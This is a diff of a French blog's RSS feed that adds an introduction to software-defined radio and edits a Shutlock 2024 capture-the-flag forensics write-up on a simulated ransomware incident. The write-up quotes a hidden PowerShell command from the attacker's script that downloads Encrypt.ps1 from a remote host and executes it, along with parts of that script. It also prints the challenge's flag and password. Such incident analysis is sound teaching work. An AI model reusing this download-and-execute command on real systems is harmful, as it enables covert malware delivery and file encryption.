@@ -6,8 +6,185 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>fr</language>
 		<copyright>CC BY-NC 4.0</copyright>
-		<lastBuildDate>Fri, 12 Jul 2024 09:16:24 +0200</lastBuildDate>
+		<lastBuildDate>Fri, 06 Dec 2024 11:04:20 +0100</lastBuildDate>
 		<atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Introduction à la SDR</title>
+			<link>http://localhost:1313/posts/introduction_sdr/introduction_sdr/</link>
+			<pubDate>Fri, 06 Dec 2024 11:04:20 +0100</pubDate>
+			
+			<guid>http://localhost:1313/posts/introduction_sdr/introduction_sdr/</guid>
+			<description><![CDATA[%!s(<nil>)]]></description>
+			<content type="html"><![CDATA[<p><em>&ldquo;La SDR (pour Software Defined Radio) est un récepteur et éventuellement émetteur radio réalisés principalement par logiciel et dans une moindre mesure par matériel&rdquo;</em> (merci <a href="https://fr.wikipedia.org/wiki/Radio_logicielle">Wikipédia</a>).</p>
+<p>Cet article est une introduction à la SDR orienté hacking, des principes de base au choix du matériel.</p>
+<p>Je vais donc commencer par faire un court rappel sur ce que sont les ondes radio, la législation en vigeur, et enfin présenter les matériels et logiciels couramment utilisés.</p>
+<hr>
+<h2 id="les-ondes-radio">Les ondes radio</h2>
+<p>Une onde radioélectrique, ou <strong>onde radio</strong>, est une onde électromagnétique inférieure à 300 GHz, cela inclut les bandes FM, AM, VHF, les Takie-Walkie, les liaisons satellite, GSM, etc.</p>
+<p>Ci dessous, un tableau donnant leur appelation en fonction de leur fréquence:</p>
+<figure align="center">
+    <img alt="Fréquences radio" title="Fréquences radio" src="/posts/introduction_sdr/images/frequences_radio.png">
+	<figcaption>Fréquences radio</figcaption>
+</figure>
+<p><em>Source: <a href="https://fr.wikipedia.org/wiki/Onde_radio">Wikipedia</a> - Des spectres plus détaillés sont disponibles <a href="https://www.anfr.fr/fileadmin/medias/institutionnel/ANFR-spectre-frequences-juin-2020.pdf">ici</a> et <a href="https://www.emitech.fr/en/radiofrequency-testing">ici</a>.</em></p>
+<p>Il est possible, avec un matériel adapté, de capter ces fréquences à moindre coût.</p>
+<hr>
+<h2 id="partie-juridique">Partie juridique</h2>
+
+    <aside class="admonition warning">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><b>Attention !</b>
+        </div>
+        <div class="admonition-content">Cette partie s&rsquo;applique en France uniquement !</div>
+    </aside>
+<p>Comme tout est réglementé, et l&rsquo;émission d&rsquo;ondes radio n&rsquo;en étant pas excepté, il faut connaître la législation en vigueur pour ne pas faire n&rsquo;importe quoi, il faut également garder en tête qu&rsquo;elle peut changer d&rsquo;un pays à un autre, aux abord des zones sensibles (zones militaires, aéroports, etc.) en même fonction des métropoles.</p>
+<h3 id="autorité">Autorité</h3>
+<p>L&rsquo;autorité qui s&rsquo;occuper des ondes radio en France est l&rsquo;Agence Nationale des Fréquences Radio (ANFR).</p>
+<p>Elle a cinq missions principales:</p>
+<ul>
+<li><strong>Planifier</strong> l&rsquo;usage des fréquences</li>
+<li><strong>Gérer</strong> les fréquences sites et données</li>
+<li><strong>Contrôler</strong> le spectre</li>
+<li><strong>Protéger</strong> les utilisateurs et services</li>
+<li><strong>Maîtriser</strong> l&rsquo;exposition du public aux ondes</li>
+</ul>
+<p>Bien que l&rsquo;Agence ne puisse pas directement donner d&rsquo;amendes, elle peut enquêter et intervenir en qualité d&rsquo;experte technique sur les cas d&rsquo;usage repréhensibles des ondes radio (brouillage, empiétement de fréquence, radio pirate, etc.).</p>
+<p>Elle travaille conjointement avec l&rsquo;<a href="https://www.arcep.fr">ARCEP</a> et l&rsquo;<a href="https://www.arcom.fr">ARCOM</a>.</p>
+
+    <aside class="admonition danger">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-triangle"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div><b>Attention !</b>
+        </div>
+        <div class="admonition-content">La peine encouru en cas d&rsquo;infraction peut aller jusqu&rsquo;a 6 mois de prison et 30 000€ d&rsquo;amende !</div>
+    </aside>
+<h3 id="réception">Réception</h3>
+<p>Pour ce qui est de la réception, il n&rsquo;y a pas vraiment de restrictions, seul le déchiffrement de communications (notamment militaire ou du réseau <a href="https://fr.wikipedia.org/wiki/Terrestrial_Trunked_Radio">Tetra</a>) est interdit.</p>
+<p>Cependant, même en cas de simple captation de communications (chiffrées ou non), l&rsquo;ANFR peut venir vérifier que vous ne faîtes rien d&rsquo;illégale.</p>
+<h3 id="emission">Emission</h3>
+<p>Concernant l&rsquo;émission, la règle générale est d&rsquo;aller vérifier, en fonction de la bande de fréquences utilisée:</p>
+<ul>
+<li>Si on en a le <strong>droit</strong>, en prenant en compte la localisation</li>
+<li>Pendant combien de <strong>temps</strong></li>
+<li>A quelle <strong>puissance</strong></li>
+</ul>
+<p>Car cela peut fortement varier d&rsquo;une bande de fréquences à une autre.</p>
+<p>Par exemple, pour le <strong>LoRa</strong> (fréquences de 4330.5MHz à 434.79MHz et 863MHz à 868.6MHz), le taux d&rsquo;utilisation maximum est limité à <strong>1%</strong> du temps sur une heure glissante (en gros, pas plus de <strong>36s</strong> par heure) avec une puissance maximale de <strong>25mW</strong>.</p>
+<p><em>Des documents très complets sont disponibles sur le site de l&rsquo;<a href="https://www.anfr.fr/planifier/le-tnrbf/lautorisation-dutilisation">ANFR</a> et de l&rsquo;<a href="https://www.arcep.fr/la-regulation/grands-dossiers-reseaux-mobiles/le-guichet-start-up-et-innovation/le-portail-bandes-libres.html">ARCEP</a>.</em></p>
+<hr>
+<h2 id="le-matériel">Le matériel</h2>
+<p>Afin de pouvoir écouter ces ondes, il faut pouvoir les capter, et pour ça, il existe beaucoup de matériels différents comme les clés <strong>RTL-SDR</strong>, le <strong>Flipper Zero</strong>, le <strong>HackRF</strong>, le <strong>BladeRF</strong>, le <strong>Lime-SDR</strong>, le <strong>KrakenRF</strong>, etc.</p>
+<p>Concernant quoi choisir.. tout dépend de vos besoins et de votre budget, voici une liste non exhaustive des matériels couramment utilisés:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center"><strong>Hardware</strong></th>
+          <th style="text-align: center"><strong>RX/TX</strong></th>
+          <th style="text-align: center"><strong>Duplex</strong></th>
+          <th style="text-align: center"><strong>Radio spectrum</strong></th>
+          <th style="text-align: center"><strong>Bandwidth</strong></th>
+          <th style="text-align: center"><strong>Price</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Clé RTL-SDR</td>
+          <td style="text-align: center">RX</td>
+          <td style="text-align: center">Half</td>
+          <td style="text-align: center">~ 24MHz - 1.766GHz</td>
+          <td style="text-align: center">6.7MHz - 8MHz</td>
+          <td style="text-align: center">~ 30€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Flipper Zero</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Half</td>
+          <td style="text-align: center">300MHz-348MHz, 387MHz-464MHz, 779MHz-928MHz</td>
+          <td style="text-align: center">58KHz - 812KHz</td>
+          <td style="text-align: center">~ 200€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">HackRF</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Half</td>
+          <td style="text-align: center">30MHz - 6GHz</td>
+          <td style="text-align: center">20MHz</td>
+          <td style="text-align: center">~ 320€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">BladeRF</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Full</td>
+          <td style="text-align: center">300MHz - 3.8GHz</td>
+          <td style="text-align: center">28MHz</td>
+          <td style="text-align: center">~ 780€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">USRP</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Full</td>
+          <td style="text-align: center">50MHz - 6GHz</td>
+          <td style="text-align: center">16MHz - 61.44MHz</td>
+          <td style="text-align: center">~ 2k€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Lime-SDR</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Full</td>
+          <td style="text-align: center">~ 30MHz - 3.8GHz</td>
+          <td style="text-align: center">~ 40MHz - 120MHz</td>
+          <td style="text-align: center">~ 340€ - 20k€</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">KrakenSDR</td>
+          <td style="text-align: center">RX/TX</td>
+          <td style="text-align: center">Full</td>
+          <td style="text-align: center">24MHz - 1766MHz</td>
+          <td style="text-align: center">2.56MHz</td>
+          <td style="text-align: center">~ 500€</td>
+      </tr>
+  </tbody>
+</table>
+<p>Comme on peut le voir, chaque solution à ses avantages et inconvenients.</p>
+<p>Si vous débutez dans le monde de la SDR, je ne peux que vous conseiller la clé RTL-SDR car ça coute moins de 30€, ça à une plage d&rsquo;utilisation très large, une antenne est fournie avec, c&rsquo;est petit et compatible avec tout !</p>
+<p>Il y en a ici aussi une pléthore, je vous conseille cependant d&rsquo;utiliser une <strong>Clé USB RTL2832 avec tuner R860</strong> (disponible sur <a href="https://www.passion-radio.fr/recepteurs-sdr/rtl-sdr-r820t2-248.html">Passion radio</a> et <a href="https://www.amazon.fr/R%C3%A9cepteur-ventouse-adaptateur-femelle-r%C3%A9cepteur/dp/B094ZJ3VVN/ref=sr_1_4?__mk_fr_FR=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;crid=J5HBVVQTMDV6&amp;keywords=Cl%C3%A9+USB+RTL2832&amp;qid=1687622893&amp;sprefix=cl%C3%A9+usb+rtl2832%2Caps%2C223&amp;sr=8-4">Amazon</a>), elle à un spectre assez large, de 24MHz à 1,766GHz, et posséde le chipset <strong>Realtek RTL2832U</strong> ainsi que le tuner <strong>Rafael Micro R860</strong> qui sont faits pour la SDR.</p>
+<hr>
+<h2 id="les-outils-logiciels">Les outils logiciels</h2>
+<p>Voici grossiérement la liste des logiciels les plus utilisés:</p>
+<ul>
+<li><a href="https://github.com/gnuradio/gnuradio">GNURadio</a></li>
+<li><a href="https://github.com/gqrx-sdr/gqrx">GQRX</a> (ou <a href="https://airspy.com/">Airspy</a> pour Windows)</li>
+<li><a href="https://github.com/antirez/dump1090">Dump1090</a></li>
+</ul>
+<p>Ils sont open-source (excepté Airspy) et disponibles sur Linux et Windows.</p>
+<p><strong>GQRX</strong> (ou <strong>Airpsy</strong>) permettent d&rsquo;analyser un spectre, de le démoduler selon certaines modulations et de l&rsquo;écouter/enregistrer.</p>
+<p><strong>Dump1090</strong> est spécifique à la récupération des trames des balises d&rsquo;avions (<strong>ADS-B</strong>), il permet de visualiser les informations qu&rsquo;elles contiennent et afficher les appareils sur une carte.</p>
+<p>Enfin, <strong>GnuRadio</strong> est LE logiciel de SDR, il permet de faire littéralement ce qu&rsquo;on veut, en réception ou en émission !</p>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>Voila qui clos cette introduction à la SDR, vous savez maintenant à peu près de quoi il s&rsquo;agit, la réglementation en vigeur, le matériel nécessaire ainsi que les logiciels couramment utilisés.</p>
+<p>Dans un prochain chapitre, nous allons voir comment utiliser ces logiciels ainsi que quelques exemples concrets.</p>
+<hr>
+<h2 id="sources">Sources</h2>
+<p><a href="https://fr.wikipedia.org/wiki/Onde_radio">https://fr.wikipedia.org/wiki/Onde_radio</a></p>
+<p><a href="https://anfr.fr">https://anfr.fr</a></p>
+<p><a href="https://www.radioamateurs-france.fr/wp-content/uploads/2015/07/A-ANFR-presentation.pdf">https://www.radioamateurs-france.fr/wp-content/uploads/2015/07/A-ANFR-presentation.pdf</a></p>
+<p><a href="https://arcep.fr">https://arcep.fr</a></p>
+<p><a href="https://arcom.fr">https://arcom.fr</a></p>
+<p><a href="https://fr.wikipedia.org/wiki/Terrestrial_Trunked_Radio">https://fr.wikipedia.org/wiki/Terrestrial_Trunked_Radio</a></p>
+<p><a href="http://www.taylorkillian.com/2013/08/sdr-showdown-hackrf-vs-bladerf-vs-usrp.html">http://www.taylorkillian.com/2013/08/sdr-showdown-hackrf-vs-bladerf-vs-usrp.html</a></p>
+<p><a href="https://docs.flipper.net/">https://docs.flipper.net/</a></p>
+<p><a href="https://limemicro.com/">https://limemicro.com/</a></p>
+<p><a href="https://www.krakenrf.com/">https://www.krakenrf.com/</a></p>
+<p><a href="https://github.com/krakenrf/krakensdr_docs/wiki#technical-specifications">https://github.com/krakenrf/krakensdr_docs/wiki#technical-specifications</a></p>
+<p><a href="https://www.passion-radio.org/blog/sdr-sharp-dongle-rtl2832-r820t-e4000/76466">https://www.passion-radio.org/blog/sdr-sharp-dongle-rtl2832-r820t-e4000/76466</a></p>
+<p><a href="https://homepages.uni-regensburg.de/~erc24492/SDR/Data_rtl2832u.pdf">https://homepages.uni-regensburg.de/~erc24492/SDR/Data_rtl2832u.pdf</a></p>
+<p><a href="https://github.com/gnuradio/gnuradio">https://github.com/gnuradio/gnuradio</a></p>
+<p><a href="https://github.com/gqrx-sdr/gqrx">https://github.com/gqrx-sdr/gqrx</a></p>
+<p><a href="https://airspy.com/">https://airspy.com/</a></p>
+<p><a href="https://github.com/antirez/dump1090">https://github.com/antirez/dump1090</a></p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2</title>
@@ -34,17 +211,17 @@
 <h2 id="investigation">Investigation</h2>
 <h3 id="système-de-fichier">Système de fichier</h3>
 <p>La première chose que j&rsquo;ai fait a été de parcourir le dossier <strong>FileSystem</strong> afin d&rsquo;essayer de trouver une piste.</p>
-<p>En me rendant dans dans les dossier personnels de l&rsquo;utilisatrice (<strong>Desktop</strong>, <strong>Documents</strong> et <strong>Downloads</strong>), je me suis rendu compte que des objets portent l&rsquo;extension <code>.shutlock</code>, notamment un objet <strong>importante_recherche.shutlock</strong>. Les ouvrir ne sert à rien car il n&rsquo;y a rien de lisible, on a surement trouvé les fichiers chiffrés.</p>
-<p>On peut également remarquer un fichier nommé <strong>iv</strong> dans le dossier Documents, il n&rsquo;a rien à faire la et on peut supposer qu&rsquo;il à servit au chiffrement des données, on le met donc de côté.</p>
+<p>En me rendant dans les dossier personnels de l&rsquo;utilisatrice (<strong>Desktop</strong>, <strong>Documents</strong> et <strong>Downloads</strong>), je me suis rendu compte que des objets portent l&rsquo;extension <code>.shutlock</code>, notamment un objet <strong>importante_recherche.shutlock</strong>. Les ouvrir ne sert à rien car il n&rsquo;y a rien de lisible, on a surement trouvé les fichiers chiffrés.</p>
+<p>On peut également remarquer un fichier nommé <strong>iv</strong> dans le dossier <strong>Documents</strong>, il n&rsquo;a rien à faire la et on peut supposer qu&rsquo;il à servit au chiffrement des données, on le met donc de côté.</p>
 <p>On à également un dossier <strong>AppData</strong> mais rien n&rsquo;a l&rsquo;air intéressant de prime abord, on y reviendra suremment plus tard.</p>
 <p>Après avoir fait le tour du dossier, on peut aller voir du côté de la capture réseau.</p>
 <h3 id="capture-réseau">Capture réseau</h3>
 <p>Afin d&rsquo;analyser cette capture, on ouvre le fichier avec <a href="https://www.wireshark.org/">Wireshark</a> (ou <a href="https://www.wireshark.org/docs/man-pages/tshark.html">Tshark</a> pour la version CLI), on se rend alors compte que le fichier est très gros et que chercher &ldquo;a la main&rdquo; n&rsquo;est pas la solution la plus efficace.</p>
-<p>Afin de dégrossire tout ça, on va chercher à identifier l&rsquo;adresse du PC en lister les adresses privées, pour ça il faut se rendre dans <code>Statistiques &gt; Points de terminaison &gt; IPV4</code>.</p>
+<p>Afin de dégrossire tout ça, on va chercher à identifier l&rsquo;adresse du PC en listant les adresses privées, pour ça il faut se rendre dans <code>Statistiques &gt; Points de terminaison &gt; IPV4</code>.</p>
 <p>On trouve alors deux adresses IP privées, la <strong>192.168.1.1</strong> et la <strong>10.0.2.15</strong>.</p>
 <p>On peut revenir sur la capture et filtrer les résultats pour avoir l&rsquo;une ou l&rsquo;autre des adresses: <code>ip.addr==192.168.1.1 || ip.addr==10.0.2.15</code>.</p>
-<p>Bien que cela ait dégrossi, il rest encore beaucoup d&rsquo;entrées, on remarque également qu&rsquo;il y a beaucoup de requêtes TCP, on peut alors aller regarder les protocoles présents en se rendant dans <code>Statistiques &gt; Hiérarchie des Protocoles</code>.</p>
-<p>Le tableau qui s&rsquo;affiche nous apprend qu&rsquo;il y a en plus TLS et DNS, il y a du HTTP et qu&rsquo;il comprend lui même des fichiers JPEG, du texte, etc. C&rsquo;est notre piste.</p>
+<p>Bien que cela ait un peu réduit le nombre d&rsquo;entrées, il rest encore beaucoup d&rsquo;entrées, on remarque également qu&rsquo;il y a beaucoup de requêtes TCP, on peut alors aller regarder les protocoles présents en se rendant dans <code>Statistiques &gt; Hiérarchie des Protocoles</code>.</p>
+<p>Le tableau qui s&rsquo;affiche nous apprend qu&rsquo;il y a du, TLS, du DNS mais surtout des transferts de fichiers en HTTP (JPEG, du texte, etc.). ça ressemble à une piste.</p>
 <p>Afin de voir les fichiers échangés en HTTP, il faut se rendre dans <code>Fichier &gt; Exporter Objets &gt; HTTP...</code> et regrouper les adresses IPs d&rsquo;un côté et les noms d&rsquo;hôtes de l&rsquo;autre en cliquant sur &ldquo;Organiser par nom d&rsquo;hôte&rdquo; en haut.</p>
 <p>On peut voir que plusieurs fichiers ont été échangés avec l&rsquo;IP <strong>172.21.195.17</strong>, soit:</p>
 <ul>
@@ -54,7 +231,7 @@
 <li><strong>key.txt</strong></li>
 <li><strong>wallpaper.jpg</strong></li>
 </ul>
-<p>Les plus intéressants sont Enigma.ps1, Encrypt.ps1 et key.txt, on les téléchargent.</p>
+<p>Les plus intéressants sont <strong>Enigma.ps1</strong>, <strong>Encrypt.ps1</strong> et <strong>key.txt</strong>, on les téléchargent.</p>
 <h3 id="analyse-des-scripts">Analyse des scripts</h3>
 <p>Ces scripts powershell sont très certainement ceux qui ont été utilisés pour chiffrer le PC, on va donc essayer de comprendre ce qu&rsquo;ils font.</p>
 <h4 id="enigmaps1">Enigma.ps1</h4>
@@ -107,7 +284,7 @@
 </span></span></code></pre></div><p>Ce script est celui qui a très certainement été lancé en premier, il va créer la tâche planifiée vu avant, chiffrer les fichiers, changer le fond d&rsquo;écran et créer le fichier instructions.txt.</p>
 <p>La seule ligne qui nous intéresse pour déchiffrer les fichier est celle la:
 <code>powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c &quot;&amp; {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}&quot;</code></p>
-<p>Elle appelle le script <strong>Encrypt.ps1</strong> qui est en charge de chiffrer les fichiers.</p>
+<p>Elle appelle le script <strong>Encrypt.ps1</strong> qui est en charge de chiffrer les fichiers sur le bureau.</p>
 <h4 id="encryptps1">Encrypt.ps1</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Define the directories to search for files</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$IP_addr</span> <span class="p">=</span> <span class="s1">&#39;172.21.195.17:5000&#39;</span>
@@ -172,10 +349,10 @@
 <li>Créé un objet <strong>RijndaelManaged</strong></li>
 <li>Chiffre les fichiers de manière récursive</li>
 </ul>
-<p>Maintenant que l&rsquo;ont sait ça, on a besoin de savoir (même si on peut s&rsquo;en douter) quel méthode de chiffrement a été utilisé, on cherche alors ce qu&rsquo;est l&rsquo;objet <strong>RijndaelManaged</strong> en Powershell et on tombe sur cet <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndael?view=net-8.0">article</a> qui nous explique que c&rsquo;est, grosso modo, de l&rsquo;<strong>AES</strong>.</p>
-<p>L&rsquo;AES étant un algorithme de chiffrement symétrique, la clé de chiffrement est la même que celle de déchiffrement, ont a alors tout ce qu&rsquo;il faut pour déchiffrer les fichiers.</p>
+<p>Maintenant que l&rsquo;ont sait ça, on a besoin de déterminer (même si on peut s&rsquo;en douter) quel méthode de chiffrement a été utilisée, on cherche alors ce qu&rsquo;est l&rsquo;objet <strong>RijndaelManaged</strong> en Powershell et on tombe sur cet <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndael?view=net-8.0">article</a> qui nous explique que c&rsquo;est, grosso modo, de l&rsquo;<strong>AES</strong>.</p>
+<p>L&rsquo;AES étant un algorithme de chiffrement symétrique, il n&rsquo;y a qu&rsquo;une seule clé pour les deux opérations, ont a alors tout ce qu&rsquo;il faut pour déchiffrer les fichiers.</p>
 <h3 id="déchiffrement-des-fichiers">Déchiffrement des fichiers</h3>
-<p>Afin de déchiffrer les fichiers, j&rsquo;ai écrit le script en Python suivant:</p>
+<p>Pour faire ça, j&rsquo;ai écrit le script Python suivant:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
@@ -199,42 +376,33 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">decrypt</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>
 </span></span></code></pre></div><p>Il va permettre de déchiffrer le fichier en argument et lui rajouter l&rsquo;extension <strong>.dec</strong>.</p>
-<p>J&rsquo;utilise ce script pour déchiffrer (au hasard) l&rsquo;objet <strong>importante_recherche.shutlock</strong> et pour savoir quel est l&rsquo;extension du fichier déchiffrer, on peut tout simplement utiliser la commande <strong>file</strong> sous Linux (ou a la main en regardant le <strong>Magic Byte</strong>):</p>
+<p>J&rsquo;utilise ce script pour déchiffrer (au hasard) l&rsquo;objet <strong>importante_recherche.shutlock</strong>? Afin de déterlinerquel est son extension d&rsquo;origine, on peut tout simplement utiliser la commande <strong>file</strong> sous Linux (ou a la main en regardant le <strong>Magic Byte</strong>):</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">file importante_recherche.shutlock.dec
 </span></span><span class="line"><span class="cl">importante_recherche.shutlock.dec: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
-</span></span></code></pre></div><p>On a donc un <strong>.zip</strong>, la partie <strong>compression method=AES Encrypted</strong> nous indique qu&rsquo;il est protégé par un mot de passe, que nous allons devoir trouver.</p>
+</span></span></code></pre></div><p>On a donc un <strong>.zip</strong>, la partie <strong>compression method=AES Encrypted</strong> nous indique qu&rsquo;il est protégé par un mot de passe.</p>
+<p>J&rsquo;ai déchiffré tous les autres fichiers mais ils ne contiennent rien d&rsquo;important.</p>
+<h3 id="mot-de-passe-de-larchive">Mot de passe de l&rsquo;archive</h3>
+<p>Le système de fichier est déchiffré mais pourtant pas de flag en vue et une archive protégée par mot de passe, la suite logique est alors de la déchiffrer !</p>
 
     <aside class="admonition note">
         <div class="admonition-title">
             <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></div><b>Note</b>
         </div>
-        <div class="admonition-content">Il existe une technique permettant de craquer une archive chiffrée (très bien expliqué dans cet <a href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">article</a>) mais cela fonctionne uniquement quand l&rsquo;archive est chiffrée avec <strong>ZipCrypto</strong>, ce qui n&rsquo;est pas nôtre cas ici.</div>
+        <div class="admonition-content">Il existe une technique permettant de craquer une archive chiffrée (très bien expliqué dans cet <a href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">article</a> de <a href="https://pwn.by/noraj/">Noraj</a>) mais cela fonctionne uniquement quand l&rsquo;archive est chiffrée avec <strong>ZipCrypto</strong>, ce qui n&rsquo;est pas nôtre cas ici.</div>
     </aside>
-<p>J&rsquo;ai déchiffré tous les autres fichiers mais ils ne contiennent rien d&rsquo;important.</p>
-<h3 id="mot-de-passe-de-larchive">Mot de passe de l&rsquo;archive</h3>
-<p>Le système de fichier est déchiffré mais pourtant pas de flag en vue et une archive protégée par mot de passe, la suite logique est alors de la déchiffrer !</p>
 <p>Malheureusement, l&rsquo;archive ne nous fournir aucune piste sur ou chercher et, comme je le disais au dessus, aucun autre fichier dans le répertoire personnel de l&rsquo;utilisatrice n&rsquo;a d&rsquo;importance (on a une image de canard ainsi que des fichiers remplis de données aléatoire). Le seul endroit ou on n&rsquo;a pas encore regardé est le dossier <strong>AppData</strong>.</p>
 <p>Ce dossier contient les fichiers de paramètres ainsi que pleins d&rsquo;autres informations utilisées par les applications installées sur le système.</p>
-
-    <aside class="admonition warning">
-        <div class="admonition-title">
-            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><b>Avertissement</b>
-        </div>
-        <div class="admonition-content"><p>La résolution ci-dessous est-ce celle que j&rsquo;ai eu pendant le CTF.</p>
-<p>J&rsquo;ai fonctionné à taton avant de trouver ça, d&rsquo;autres chemins plus &ldquo;cadrés&rdquo; étaient possibles.</p>
-</div>
-    </aside>
 <p>Dans ce dossier, il était possible de regarder à beaucoup d&rsquo;endroits, mais un a pu me faire avance, il s&rsquo;agit de <strong>ActivitiesCache.db</strong>.</p>
 <p>Cette base de données située dans <code>FileSystem/AppData/Local/ConnectedDevicesPlatform/L.clara/</code> enregistre les activitées de l&rsquo;utilisateur sur le poste, on peut l&rsquo;ouvir avec des outils tel que <a href="https://sqlitebrowser.org/">sqlitebrowser</a>.</p>
 <p>En parcourant cette dernière, dans la table <strong>Activity</strong>, on finit par remarque à la ligne 14 l&rsquo;application <strong>Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App</strong>.</p>
 <p>Ni une ni deux, on part explorer l&rsquo;arborescence <code>FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/</code> (<strong>&hellip;/Packages/</strong> contenant les données de toutes les application).</p>
-<p>On trouve alors la BDD <strong>plum.sqlite</strong> (contenue dans le dossier LocalState) contenant le contenu des notes:</p>
+<p>On trouve alors la BDD <strong>plum.sqlite</strong> (contenue dans le dossier <strong>LocalState</strong>) stockant le contenu des notes:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!
 </span></span></code></pre></div><p>Super ! On a enfin notre&hellip; flag ?</p>
 <p>Bien que le mot de passe permet effectivement d&rsquo;ouvrir l&rsquo;archive, on obtient alors seulement deux fichiers, <strong>chiffrement.jpeg</strong> et <strong>recherches_algorithmes_de_chiffrement.pdf</strong> ne donnant aucun flag (et évidemment, <strong>SHLK{s3cr3t_r3ch3rch3_pwd_!}</strong> ne fonctionne pas).</p>
 <h3 id="stéganographie">Stéganographie</h3>
-<p>Ouvir l&rsquo;archive étant une étape nécessaire dans la résolution, il est très peu probable que le flag soit caché dans le dossier <strong>AppData</strong>, on va alors se concentrer sur les deux fichiers extraits sur lesquels il nous reste plus qu&rsquo;a faire de la stéganographie.</p>
-<p>J&rsquo;ai alors choisit de commencer par l&rsquo;image car c&rsquo;est l&rsquo;endroit le plus répandu en stégano pour cacher des choses, et pour cela, plusieurs sont possibles:</p>
+<p>Ouvrir l&rsquo;archive étant une étape nécessaire dans la résolution, il est très peu probable que le flag soit caché ailleurs dans le dossier <strong>AppData</strong> ou dans la <strong>capture réseau</strong>, on va alors se concentrer sur les deux fichiers extraits sur lesquels il nous reste plus qu&rsquo;a faire de la stéganographie.</p>
+<p>J&rsquo;ai alors choisit de commencer par l&rsquo;image car c&rsquo;est l&rsquo;endroit le plus répandu en stéganographie pour cacher des choses, et pour cela, plusieurs logiciels sont possibles:</p>
 <ul>
 <li>strings: Aucun résultat</li>
 <li>binwalk: Aucun résultat</li>
@@ -243,6 +411,10 @@
 <li><a href="https://www.aperisolve.com">Aperisolve</a>: Fichier embarqué - flag.txt</li>
 </ul>
 <p>Steghide et Aperisolve ont trouvés un fichier <strong>flag.txt</strong>, on l&rsquo;extrait et on récupère le flag: <code>SHLK{4uri3z-v0us_cl1qu3r}</code>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Ce chal en deux parties était très cool car plutôt abordable en étant pas trop mal réaliste (et surtout avec du contexte !).</p>
